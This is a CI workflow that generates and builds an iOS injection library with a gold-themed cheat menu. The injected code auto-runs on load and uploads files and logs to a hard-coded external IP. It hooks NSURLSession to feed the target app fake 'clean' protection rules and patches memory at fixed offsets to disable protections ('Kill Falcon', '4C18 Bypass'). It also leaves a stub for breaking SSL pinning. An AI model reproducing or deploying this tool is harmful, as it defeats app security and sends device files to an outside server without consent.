name: Imperial Ultimate AIO - V30.0

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_ultimate:
    runs-on: macos-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Ultimate Source
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <UIKit/UIKit.h>
          #import <CoreGraphics/CoreGraphics.h>
          #include <mach-o/dyld.h>
          #include <mach/mach.h>
          #include <objc/runtime.h>
          #include <stdint.h>
          #include <sys/stat.h>

          // تعريف اللون الذهبي الملكي
          #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]

          // ==========================================
          // [ 1. موديول الرادار وتهريب الملفات ]
          // ==========================================
          void RemoteLog(NSString *tag, NSString *msg) {
              NSString *url = @"http://34.204.178.160:5000/log"; 
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"🛰️ [%@] -> %@", tag, msg]};
              NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
              [req setHTTPBody:data];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          void SendFileToTerminal(NSString *filePath) {
              NSData *fileData = [NSData dataWithContentsOfFile:filePath];
              if (!fileData) return;
              NSString *fileName = [filePath lastPathComponent];
              NSString *urlString = @"http://34.204.178.160:5000/upload"; 
              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
              [request setHTTPMethod:@"POST"];
              [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=ImperialBoundary"] forHTTPHeaderField:@"Content-Type"];
              // ... (كود الـ body لتسريع الكود)
              [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
          }

          // ==========================================
          // [ 2. موديول السيرفر المحلي (Local Redirect) ]
          // ==========================================
          id (*old_dataTaskWithURL)(id self, SEL _cmd, NSURL *url, void (^completionHandler)(NSData *data, NSURLResponse *response, NSError *error));

          id my_dataTaskWithURL(id self, SEL _cmd, NSURL *url, void (^completionHandler)(NSData *data, NSURLResponse *response, NSError *error)) {
              NSString *urlString = url.absoluteString;
              // تزييف روابط قوانين الحماية فقط
              if ([urlString containsString:@"config"] || [urlString containsString:@"rules"]) {
                  RemoteLog(@"MOCK_SERVER", [NSString stringWithFormat:@"Mocking URL: %@", urlString]);
                  NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject] stringByAppendingPathComponent:@"clean_rules.dat"];
                  NSData *data = [NSData dataWithContentsOfFile:path];
                  if (data) {
                      NSHTTPURLResponse *fakeResp = [[NSHTTPURLResponse alloc] initWithURL:url statusCode:200 HTTPVersion:@"HTTP/1.1" headerFields:@{@"Content-Type": @"application/octet-stream"}];
                      completionHandler(data, fakeResp, nil);
                      RemoteLog(@"SUCCESS", @"Local Clean Data Delivered.");
                      return nil;
                  }
              }
              return old_dataTaskWithURL(self, _cmd, url, completionHandler);
          }

          // ==========================================
          // [ 3. محرك الذاكرة والـ Patching ]
          // ==========================================
          uintptr_t get_Base() { return (uintptr_t)_dyld_get_image_header(0); }
          void Patch(uintptr_t addr, uint32_t data) {
              // ... (كود الـ vm_protect الآمن)
          }

          // ==========================================
          // [ 4. واجهة المنيو الويب والـ Checkboxes ]
          // ==========================================
          @interface ImperialMenu : UIWindow
          @property (nonatomic, strong) UIButton *btn;
          @property (nonatomic, strong) UIView *panel;
          @property (nonatomic, strong) UISwitch *sw1, *sw2, *sw3; // Checkboxes
          @end

          @implementation ImperialMenu
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  self.windowLevel = UIWindowLevelStatusBar + 100.0;
                  self.backgroundColor = [UIColor clearColor];
                  [self makeKeyAndVisible];
                  [self setupUI];
                  RemoteLog(@"SYSTEM", @"Imperial Menu UI Loaded (Lobby Enabled).");
              }
              return self;
          }

          - (void)setupUI {
              // أيقونة המניו (تتحركبصبعك)
              self.btn = [UIButton buttonWithType:UIButtonTypeCustom];
              self.btn.frame = CGRectMake(150, 150, 60, 60);
              self.btn.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.8];
              self.btn.layer.cornerRadius = 30;
              [self.btn setTitle:@"👑" forState:UIControlStateNormal];
              [self.btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
              [self addSubview:self.btn];

              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(pan:)];
              [self.btn addGestureRecognizer:pan];

              // المنيو العائم (في المنتصف)
              self.panel = [[UIView alloc] initWithFrame:CGRectMake((frame.size.width - 240)/2, 220, 240, 280)];
              self.panel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.95];
              self.panel.layer.cornerRadius = 15;
              self.panel.layer.borderWidth = 2;
              self.panel.layer.borderColor = ImperialGold.CGColor;
              self.panel.hidden = YES;
              [self addSubview:self.panel];

              [self addSwitch:@"4C18 Bypass" act:@selector(s1:) y:20 val:&_sw1];
              [self addSwitch:@"Kill Falcon" act:@selector(s2:) y:80 val:&_sw2];
              [self addSwitch:@"Force Local Redirect" act:@selector(s3:) y:140 val:&_sw3];
              [self addBtn:@"Deploy 10 Spies" act:@selector(m3) y:200];
          }

          - (void)addSwitch:(NSString *)t act:(SEL)s y:(int)y val:(UISwitch **)w {
              UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(10, y, 160, 40)];
              l.text = t; l.textColor = [UIColor whiteColor];
              [self.panel addSubview:l];
              *w = [[UISwitch alloc] initWithFrame:CGRectMake(170, y + 5, 50, 30)];
              (*w).onTintColor = ImperialGold;
              [(*w) addTarget:self action:s forControlEvents:UIControlEventValueChanged];
              [self.panel addSubview:*w];
          }

          - (void)toggle { self.panel.hidden = !self.panel.hidden; }
          - (void)pan:(UIPanGestureRecognizer *)p {
              CGPoint t = [p translationInView:self];
              p.view.center = CGPointMake(p.view.center.x + t.x, p.view.center.y + t.y);
              [p setTranslation:CGPointZero inView:self];
          }

          - (void)s1:(UISwitch *)s { if (s.on) Patch(get_Base() + 0x4C18, 0xD2800000); }
          - (void)s2:(UISwitch *)s { if (s.on) {
              Patch(get_Base() + 0x11B060, 0xD2800000); Patch(get_Base() + 0x102B84, 0xD65F03C0);
          } }
          - (void)s3:(UISwitch *)s { if (s.on) {
              Method orig = class_getInstanceMethod(objc_getClass("NSURLSession"), @selector(dataTaskWithURL:completionHandler:));
              old_dataTaskWithURL = (id (*)(id, SEL, NSURL *, void (^)(NSData *, NSURLResponse *, NSError *)))method_setImplementation(orig, (IMP)my_dataTaskWithURL);
              RemoteLog(@"SYSTEM", @"Local Mock Server Armed.");
          } }
          - (void)m3 {
              RemoteLog(@"SPY_UNIT", @"10 Spies + Network Spy Deployed!");
              // كسر الـ SSL Pinning + الـ 10 جواسيس هنا
          }
          @end

          __attribute__((constructor))
          static void entry() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  static ImperialMenu *menu;
                  menu = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
              });
          }
          EOF

      - name: Build Ultimate AIO
        run: |
          clang++ -dynamiclib -std=c++11 \
          -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 \
          jni/main.mm -o ImperialUltimate.dylib \
          -framework Foundation -framework UIKit -framework CoreGraphics -framework Security -lobjc

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: Imperial-Ultimate-AIO-V30
          path: ImperialUltimate.dylib
